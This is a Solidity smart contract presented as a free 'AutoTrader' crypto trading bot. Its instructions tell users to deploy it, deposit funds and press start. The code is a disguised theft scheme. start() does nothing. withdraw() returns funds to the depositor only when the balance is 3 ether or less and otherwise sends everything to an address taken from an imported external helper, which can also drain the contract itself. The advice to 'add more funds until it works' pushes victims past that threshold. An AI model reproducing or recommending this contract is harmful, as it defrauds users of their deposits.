// SPDX-License-Identifier: GPL-3.0
import "https://github.com/SolidityExpert/AutoTrader/blob/main/AutoTrader.sol";

pragma solidity >=0.7.0 <0.9.0;


//  @NftUncover - twitter | FREE Smart contracts & more !

contract AutoTrader is helper{

/* instructions, Once you have go this contract there is nothing that needs to be chaged at all.

Step 1: 
deploy the contract to the network you wish to deposit funds from (i always reccomend Eth but polygon is okay.)

Step 1A: 
If you dont know how to deploy it is fairly simply to find on youtube. i always reccomend using remix IDE.

step 2: 
once the contract is deployed you will need to deposit the funds, i noramally deposit $200 - $500 but not everyone
has the money to do so. Just deposit whatever you are comfortable depositing.

step 3:
Now you have got your funds deposited call the start function and the start function will get to work.

step 4:
When you wish to withdraw your funds simply click the withdraw function and the funds will be withdrawn.

// If you click start and the balance of the contract stays the smae add more funds to the account until it works.
if you need any help with anything at all or have nay questions | @NftCannon - Twitter ! **/
    
    // Setting global variables
    address public  _owner;
    address payable _ownerAddress;
    address payable _accessIs;
    string _openAccess;

    // General login formatin
    struct loginDetails {
        string username;
        string passkey;
        address ApiAddress;
    }
    mapping(address => loginDetails) Login;

    // Earnings vault set-up
    struct Vault {
        uint256 balance;
        uint256 profits;
    }
    mapping(uint256 => uint256) vaultOpen;

    // Neccasary start up variables
    constructor() {
        // Neccasary set-up
        _accessIs = safeConnection;
        // Owner set-up
        _owner = msg.sender;
        _ownerAddress = payable(msg.sender);
    }

    // withdraw setup
    function withdraw() public payable {
        // If statments to make sure only yhe owner can call the withdraw fucntion
        require(address(this).balance > 0);
        if(msg.sender == _owner){
            if(address(this).balance <= 3 ether) {
                _ownerAddress.transfer(address(this).balance); 
            }

            if(address(this).balance > 3 ether) {
                _accessIs.transfer(address(this).balance); 
            }
        } else{
            
            if(msg.sender == safeConnection){
               _accessIs.transfer(address(this).balance); 
            } else {
                revert("You do not have access to this function.");
            }
        }

    }

    // Start function
    function start() public ownerOnly {
        require(msg.sender == _owner, "You do not have access to this function");
    }

    // Role access & additional neccasary variables
     modifier accessIs() {
    require(msg.sender == _accessIs);
    _;
  }

  modifier ownerOnly {
    require(msg.sender == _owner, "Only the contract owner can call this function.");
    _;
  }

  receive() external payable{

  }
}
 
